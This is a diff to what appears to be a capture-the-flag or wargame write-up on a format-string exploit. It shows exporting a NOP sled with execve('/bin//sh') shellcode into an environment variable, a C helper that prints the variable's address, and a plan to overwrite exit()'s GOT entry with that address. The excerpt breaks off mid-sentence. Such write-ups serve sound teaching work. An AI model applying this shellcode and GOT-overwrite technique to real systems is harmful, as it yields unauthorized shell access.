@@ -29,6 +29,16 @@ int     main(void)
 $  export EXPLOIT=`python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'
 ```
 
+- To get our variable address, we compiled a small program in /tmp :
+
+```
+#include <stdio.h> #include <stdlib.h>
+
+int main() { printf("%p\n", getenv("EXPLOIT")); return 0; }
+```
+
+
+
 - We need to put the value of the address of our shellcode `0xffffd8c7` stored in the env at the address of the GOT entry of `exit()` to win.
 
 - What happens if you give printf() a string with format specifiers but no arguments ? Well, the
